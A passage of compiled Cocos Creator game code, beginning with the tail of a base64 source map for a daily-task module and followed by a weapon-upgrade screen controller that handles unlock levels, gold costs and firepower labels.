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YUFBcEI7WUFDSSxPQUFPLElBQUksQ0FBQyxVQUFVLENBQUM7UUFDM0IsQ0FBQzs7O09BQUE7SUFHRCxzQkFBVyw0QkFBb0I7YUFBL0I7WUFDSSxPQUFPLElBQUksQ0FBQyxxQkFBcUIsQ0FBQztRQUN0QyxDQUFDOzs7T0FBQTtJQTdIZ0IsSUFBSTtRQUR4QixPQUFPO09BQ2EsSUFBSSxDQThIeEI7SUFBRCxXQUFDO0NBOUhELEFBOEhDLElBQUE7a0JBOUhvQixJQUFJIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCB7V29ybGR9IGZyb20gXCIuL1dvcmxkXCI7XHJcbmltcG9ydCB7RXhjZWxUYWJsZU5hbWVzfSBmcm9tIFwiLi4vY29uZmlnL0V4Y2VsVGFibGVOYW1lc1wiO1xyXG5pbXBvcnQge0V4Y2VsQ29uZmlnfSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2NvbmZpZy9FeGNlbENvbmZpZ1wiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5leHBvcnQgaW50ZXJmYWNlIFRhc2tJdGVtUHJveHkge1xyXG4gICAgaWQ6bnVtYmVyO1xyXG4gICAgbnVtOm51bWJlcjtcclxuICAgIHRha2U6Ym9vbGVhbjtcclxufVxyXG5leHBvcnQgaW50ZXJmYWNlIFRhc2tQcm94eSB7XHJcbiAgICBsaXN0OkFycmF5PFRhc2tJdGVtUHJveHk+O1xyXG4gICAgZXhwaXJlVGltZTpudW1iZXI7XHJcbiAgICBib3g6Ym9vbGVhbjtcclxufVxyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgVGFzayB7XHJcblxyXG4gICAgcHJpdmF0ZSBzdGF0aWMgX3Rhc2tJdGVtc09mQ3VycmVudEx2OkFycmF5PFRhc2tJdGVtUHJveHk+O1xyXG5cclxuICAgIHByaXZhdGUgc3RhdGljIGluaXRDdXJyZW50THZEYXRhKCl7XHJcbiAgICAgICAgdGhpcy5fdGFza0l0ZW1zT2ZDdXJyZW50THYgPSB0aGlzLl90YXNrUHJveHkubGlzdC5tYXAodmFsdWUgPT4gPFRhc2tJdGVtUHJveHk+e2lkOnZhbHVlLmlkLCBudW06MCwgdGFrZTpmYWxzZX0pO1xyXG4gICAgfVxyXG5cclxuICAgIHN0YXRpYyAgbWVyZ2VDdXJyZW50THZEYXRhKCl7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCJtZXJnZUN1cnJlbnRMdkRhdGE9PT5cIik7XHJcbiAgICAgICAgY29uc29sZS5sb2codGhpcy5fdGFza0l0ZW1zT2ZDdXJyZW50THYsIFwidGhpcy5fdGFza0l0ZW1zT2ZDdXJyZW50THZcIik7XHJcbiAgICAgICAgbGV0IHVwZGF0ZSA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMuX3Rhc2tJdGVtc09mQ3VycmVudEx2LmZvckVhY2goKHZhbHVlLCBpbmRleCkgPT4ge1xyXG4gICAgICAgICAgICBsZXQgbGluZSA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsTGluZShFeGNlbFRhYmxlTmFtZXMudGFzaywgXCJpZFwiLCB2YWx1ZS5pZCk7XHJcbiAgICAgICAgICAgIGlmICh2YWx1ZS5udW0gPiAwICYmIHRoaXMuX3Rhc2tQcm94eS5saXN0W2luZGV4XS5udW0gPCBsaW5lWydudW0nXSl7XHJcbiAgICAgICAgICAgICAgICB0aGlzLl90YXNrUHJveHkubGlzdFtpbmRleF0ubnVtICs9IHZhbHVlLm51bTtcclxuICAgICAgICAgICAgICAgIGlmICh0aGlzLl90YXNrUHJveHkubGlzdFtpbmRleF0ubnVtID49IGxpbmVbJ251bSddKXtcclxuICAgICAgICAgICAgICAgICAgICB0aGlzLl90YXNrUHJveHkubGlzdFtpbmRleF0ubnVtID0gbGluZVsnbnVtJ107XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB1cGRhdGUgPSB0cnVlO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICAgICAgaWYgKHVwZGF0ZSl7XHJcbiAgICAgICAgICAgIHRoaXMud3JpdGUoKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIHdyaXRlKCl7XHJcbiAgICAgICAgV29ybGQuU3RvcmFnZS50YXNrID0gSlNPTi5zdHJpbmdpZnkodGhpcy5fdGFza1Byb3h5KTtcclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIHN0YXRpYyBfdGFza1Byb3h5OlRhc2tQcm94eTtcclxuXHJcbiAgICBwcml2YXRlIHN0YXRpYyBhZGROdW0odGFza0lkOm51bWJlciwgbnVtOm51bWJlcil7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCI9PT09PT0+YWRkTnVtXCIsIHRhc2tJZCwgbnVtKTtcclxuICAgICAgICBsZXQgZmluZCA9IHRoaXMuX3Rhc2tJdGVtc09mQ3VycmVudEx2LmZpbmQodmFsdWUgPT4gdmFsdWUuaWQgPT0gdGFza0lkKTtcclxuICAgICAgICBpZiAoZmluZCl7XHJcbiAgICAgICAgICAgIGZpbmQubnVtICs9IG51bTtcclxuICAgICAgICB9XHJcbiAgICAgICAgY29uc29sZS5sb2codGhpcy5fdGFza0l0ZW1zT2ZDdXJyZW50THYsIFwiLS0tLVwiKTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5Lu75Yqh5Y+q5aKe5LiN5YePICovXHJcblxyXG4gICAgLyoqIOWHu+eijumdtuWtkCAqL1xyXG4gICAgcHVibGljIHN0YXRpYyBraWxsRW5lbXkoKXtcclxuICAgICAgICB0aGlzLmFkZE51bSgxLCAxKTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5Ye756KO5bm46L+Q6L2s55uYICovXHJcbiAgICBwdWJsaWMgc3RhdGljIGtpbGxMdWNreUVuZW15KCl7XHJcbiAgICAgICAgdGhpcy5hZGROdW0oMiwgMSk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOinpuWPkeeWr+eLguaooeW8jyAqL1xyXG4gICAgcHVibGljIHN0YXRpYyB0cmlnZ2VyQ3JhenkoKXtcclxuICAgICAgICB0aGlzLmFkZE51bSgzLCAxKTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5omT6LSlQm9zcyAqL1xyXG4gICAgcHVibGljIHN0YXRpYyBraWxsQm9zcygpe1xyXG4gICAgICAgIHRoaXMuYWRkTnVtKDQsIDEpO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKiDkvb/nlKjpgZPlhbcgKi9cclxuICAgIHB1YmxpYyBzdGF0aWMgdXNlVG9vbCgpe1xyXG4gICAgICAgIHRoaXMuYWRkTnVtKDUsIDEpO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBwdWJsaWMgc3RhdGljIGluaXQoKXtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIlRhc2suaW5pdEJ1bGxldD09PT5cIik7XHJcbiAgICAgICAgLyoqIOWIneWni+avj+aXpeS7u+WKoeihqCAqL1xyXG4gICAgICAgIGxldCB0YXNrID0gPFRhc2tQcm94eT5KU09OLnBhcnNlKFdvcmxkLlN0b3JhZ2UudGFzayk7XHJcbiAgICAgICAgaWYgKCF0YXNrIHx8ICF0YXNrLmV4cGlyZVRpbWUgfHwgdGFzay5leHBpcmVUaW1lIDw9IFdvcmxkLk15LnNlcnZlclRpbWUpe1xyXG4gICAgICAgICAgICAvKiog5pu05paw5Lu75YqhICovXHJcbiAgICAgICAgICAgIHRhc2sgPSA8VGFza1Byb3h5Pnt9O1xyXG4gICAgICAgICAgICAvKiog6K6h566X5LuK5aSp55qE5pe25YiG56eSICovXHJcbiAgICAgICAgICAgIGxldCBkYXRlID0gbmV3IERhdGUoV29ybGQuTXkuc2VydmVyVGltZSk7XHJcbiAgICAgICAgICAgIGNvbnNvbGUubG9nKGAke2RhdGUuZ2V0RnVsbFllYXIoKX3lubQke2RhdGUuZ2V0TW9udGgoKX3mnIgke2RhdGUuZ2V0RGF5KCl95pelJHtkYXRlLmdldEhvdXJzKCl95pe2JHtkYXRlLmdldE1pbnV0ZXMoKX3liIYke2RhdGUuZ2V0U2Vjb25kcygpfeenkiR7ZGF0ZS5nZXRNaWxsaXNlY29uZHMoKX3mr6vnp5JgKTtcclxuICAgICAgICAgICAgbGV0IGNkID0gMjQqNjAqNjAgLSAoZGF0ZS5nZXRIb3VycygpKjYwKjYwICsgZGF0ZS5nZXRNaW51dGVzKCkqNjAgKyBkYXRlLmdldFNlY29uZHMoKSk7XHJcbiAgICAgICAgICAgIGxldCBoID0gTWF0aC5mbG9vcihjZC8zNjAwKTtcclxuICAgICAgICAgICAgbGV0IG0gPSBNYXRoLmZsb29yKChjZC1oKjM2MDApLzYwKTtcclxuICAgICAgICAgICAgbGV0IHMgPSBjZCU2MDtcclxuICAgICAgICAgICAgY29uc29sZS5sb2coYCR7aH3ml7Yke2195YiGJHtzfeenki0tLS0tLS0tLS0tYCk7XHJcbiAgICAgICAgICAgIHRhc2suZXhwaXJlVGltZSA9IFdvcmxkLk15LnNlcnZlclRpbWUgKyBjZCoxMDAwIC0gZGF0ZS5nZXRNaWxsaXNlY29uZHMoKTtcclxuICAgICAgICAgICAgdGFzay5ib3ggPSBmYWxzZTtcclxuICAgICAgICAgICAgdGFzay5saXN0ID0gW107XHJcbiAgICAgICAgICAgIC8qKiDpmo/mnLrkuInkuKrku7vliqEgKi9cclxuICAgICAgICAgICAgbGV0IHRhc2tEYXRhcyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLnRhc2spLmZpbHRlcih2YWx1ZSA9PiB2YWx1ZVsndHlwZSddID09IDEpO1xyXG4gICAgICAgICAgICBmb3IgKGxldCBpPTA7IGk8MzsgaSsrKXtcclxuICAgICAgICAgICAgICAgIGxldCBpbmRleCA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSoxMDApJXRhc2tEYXRhcy5sZW5ndGg7XHJcbiAgICAgICAgICAgICAgICBsZXQgaXRlbSA9IHRhc2tEYXRhc1tpbmRleF07XHJcbiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhpbmRleCwgaXRlbVsnaWQnXSwgXCI9PT09PVwiKTtcclxuICAgICAgICAgICAgICAgIHRhc2subGlzdC5wdXNoKHtpZDpwYXJzZUludChpdGVtWydpZCddKSwgbnVtOjAsIHRha2U6ZmFsc2V9KTtcclxuICAgICAgICAgICAgICAgIHRhc2tEYXRhcy5zcGxpY2UoaW5kZXgsIDEpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIFdvcmxkLlN0b3JhZ2UudGFzayA9IEpTT04uc3RyaW5naWZ5KHRhc2spO1xyXG4gICAgICAgIH1lbHNlIGlmKHRhc2sgJiYgIXRhc2subGlzdCkge1xyXG4gICAgICAgICAgICB0aGlzLl90YXNrUHJveHkubGlzdCA9IFtdO1xyXG4gICAgICAgICAgICBmb3IgKGxldCBrZXkgaW4gdGhpcy5fdGFza1Byb3h5KXtcclxuICAgICAgICAgICAgICAgIGlmIChrZXkgIT0gJ2V4cGlyZVRpbWUnICYmIGtleSAhPSAnYm94JyAmJiBrZXkgIT0gJ2xpc3QnKXtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgaWQgPSBwYXJzZUludChrZXkpO1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBudW0gPSB0aGlzLl90YXNrUHJveHlba2V5XTtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgbGluZSA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsTGluZShFeGNlbFRhYmxlTmFtZXMudGFzaywgXCJpZFwiLCBpZCk7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGxpbmVbJ251bSddKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRha2UgPSBudW0gPj0gbGluZVsnbnVtJ107XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMuX3Rhc2tQcm94eS5saXN0LnB1c2goe2lkOmlkLCBudW06bnVtLCB0YWtlOnRha2V9KTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy5fdGFza1Byb3h5ID0gdGFzaztcclxuXHJcbiAgICAgICAgdGhpcy5pbml0Q3VycmVudEx2RGF0YSgpO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBzdGF0aWMgZ2V0IHRhc2tQcm94eSgpOiBUYXNrUHJveHkge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl90YXNrUHJveHk7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIHN0YXRpYyBnZXQgdGFza0l0ZW1zT2ZDdXJyZW50THYoKTogQXJyYXk8VGFza0l0ZW1Qcm94eT4ge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl90YXNrSXRlbXNPZkN1cnJlbnRMdjtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/WeaponLayerController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'f0699YuuRlMApvOLWG3FOLt', 'WeaponLayerController');
// script/app/home/WeaponLayerController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var World_1 = require("../info/World");
var Extend_1 = require("../../../framework/extend/Extend");
var Toast_1 = require("../../../framework/extend/Toast");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var Facade_1 = require("../../../framework/facade/Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var WeaponLayerController = /** @class */ (function (_super) {
    __extends(WeaponLayerController, _super);
    function WeaponLayerController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.firePowerLvLabel = null;
        _this.powerLvLabel = null;
        _this.firePowerCostLabel = null;
        _this.powerCostLabel = null;
        _this.firePowerWorthLabel = null;
        _this.powerWorthLabel = null;
        _this.firePowerButton = null;
        _this.powerButton = null;
        _this.scrollView = null;
        _this.upEffectNode = null;
        _this.trialNode = null;
        _this.weaponButtons = [];
        _this._weaponFocus = -1;
        _this._orders = [];
        return _this;
    }
    WeaponLayerController.prototype.focusGunID = function () {
        return this._orders[this._weaponFocus]['id'];
    };
    Object.defineProperty(WeaponLayerController.prototype, "weaponFocus", {
        set: function (value) {
            var _this = this;
            if (this._weaponFocus != value) {
                this.upEffectNode.removeFromParent(false);
                this.weaponButtons[value].node.addChild(this.upEffectNode);
                this._weaponFocus = value;
                this.weaponButtons.forEach(function (value, index) { return value.target.getComponent(cc.Sprite).enabled = index == _this._weaponFocus; });
                this.updateWeaponAttr();
            }
        },
        enumerable: false,
        configurable: true
    });
    WeaponLayerController.prototype.updateWeaponAttr = function () {
        this.updateFirePower();
        this.updatePower();
    };
    WeaponLayerController.prototype.onLoad = function () {
        var _this = this;
        this.trialNode.active = false;
        this.weaponButtons = this.scrollView.content.children.map(function (value) { return value.getComponent(cc.Button); });
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon);
        this._orders = config.filter(function (value) { return value['id'] != 1; }).sort((function (a, b) {
            return a['order'] - b['order'];
        }));
        this.weaponButtons.forEach(function (value) {
            var id = parseInt(value.node.name);
            var cfg = _this._orders[id - 2];
            value.node.getChildByName("Background").getChildByName("Label").getComponent(cc.Label).string = cfg['gun_name'];
            // let weaponSke = value.node.getChildByName("Background").getChildByName("weapon").getComponent(sp.Skeleton);
            // weaponSke.setSkin(("000"+cfg['id']).substr(-3));
            // weaponSke.setAnimation(0, "gun", false);
            value.node.getChildByName("Background").getChildByName("weapon").active = false;
            var sprite = value.node.getChildByName("Background").getChildByName("weaponSprite").getComponent(cc.Sprite);
            var bLock = World_1.World.Storage.gameLevel < cfg['unlock'];
            sprite.setMaterial(0, cc.Material.getBuiltinMaterial(bLock ? "2d-gray-sprite" : "2d-sprite"));
            sprite.node.opacity = bLock ? 128 : 255;
        });
        cc.find('Canvas').on("UpdateStorage", this.onUpdateStorageEvent, this);
    };
    WeaponLayerController.prototype.start = function () {
        /** 选中最新解锁的武器 */
        var num = 0;
        for (var _i = 0, _a = this._orders; _i < _a.length; _i++) {
            var item = _a[_i];
            if (World_1.World.Storage.gameLevel >= item['unlock']) {
                num++;
            }
            else {
                break;
            }
        }
        if (num <= 3) {
            this.scrollView.scrollToLeft();
        }
        else if (num >= this._orders.length - 1) {
            this.scrollView.scrollToRight();
        }
        else {
            var x = (num - 3) * this.weaponButtons[0].node.width;
            this.scrollView.scrollToOffset(cc.v2(x, this.scrollView.content.y));
        }
        this.weaponFocus = num - 1;
        if (World_1.World.Storage.unlockGun > 0) {
            var index = this._orders.findIndex(function (value) { return value['id'] == World_1.World.Storage.unlockGun; });
            if (typeof index == "undefined") {
                console.error("not found gun for id===>", World_1.World.Storage.unlockGun);
            }
            else {
                this.trialNode.removeFromParent(false);
                this.trialNode.active = true;
                this.weaponButtons[index].node.addChild(this.trialNode);
            }
        }
    };
    WeaponLayerController.prototype.onDestroy = function () {
        cc.find('Canvas').off("UpdateStorage", this.onUpdateStorageEvent, this);
    };
    WeaponLayerController.prototype.onUpdateStorageEvent = function (key) {
        if (key == "goldCount") {
            var cfg = this._orders[this._weaponFocus];
            var id = cfg['id'];
            var firePowerLv = World_1.World.My.armory.levelOfEmitterFirePower(id);
            if (firePowerLv < cfg['lv_limit']) {
                var needCost = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[firePowerLv - 1]['fire_expend'];
                this.firePowerButton.interactable = World_1.World.Storage.goldCount >= needCost;
                this.firePowerCostLabel.node.color = this.firePowerButton.interactable ? cc.Color.WHITE : cc.Color.RED.fromHEX("#924338");
            }
            var powerLv = World_1.World.My.armory.levelOfEmitterPower(id);
            if (powerLv < cfg['lv_limit']) {
                var needCost = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[powerLv - 1]['power_expend'];
                this.powerButton.interactable = World_1.World.Storage.goldCount >= needCost;
                this.powerCostLabel.node.color = this.powerButton.interactable ? cc.Color.WHITE : cc.Color.RED.fromHEX("#924338");
            }
        }
    };
    WeaponLayerController.prototype.updateFirePower = function () {
        var cfg = this._orders[this._weaponFocus];
        var id = cfg['id'];
        var firePowerLv = World_1.World.My.armory.levelOfEmitterFirePower(id);
        this.firePowerLvLabel.string = "<b><outline color=#1e1e1e width=4>\u5F39\u91CF [Lv." + firePowerLv + "]</outline></b>";
        if (firePowerLv >= cfg['lv_limit']) {
            this.firePowerCostLabel.string = "<b><outline color=#1e1e1e width=3>\u6EE1\u7EA7</outline></b>";
            this.firePowerButton.interactable = false;
        }
        else {
            var needCost = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[firePowerLv - 1]['fire_expend'];
            this.firePowerCostLabel.string = "<b><outline color=#1e1e1e width=3>" + Extend_1.ext.shortFormat(needCost) + "</outline></b>";
            this.firePowerButton.interactable = World_1.World.Storage.goldCount >= needCost;
        }
        this.firePowerCostLabel.node.color = this.firePowerButton.interactable ? cc.Color.WHITE : cc.Color.RED.fromHEX("#924338");
        this.firePowerWorthLabel.string = "<b><outline color=#1e1e1e width=3>" + Extend_1.ext.shortFormat(World_1.World.My.armory.payloadAddOf(id)) + "</outline></b>";
    };
    WeaponLayerController.prototype.updatePower = function () {
        var cfg = this._orders[this._weaponFocus];
        var id = cfg['id'];
        var powerLv = World_1.World.My.armory.levelOfEmitterPower(id);
        this.powerLvLabel.string = "<b><outline color=#1e1e1e width=4>\u706B\u529B [Lv." + powerLv + "]</outline></b>";
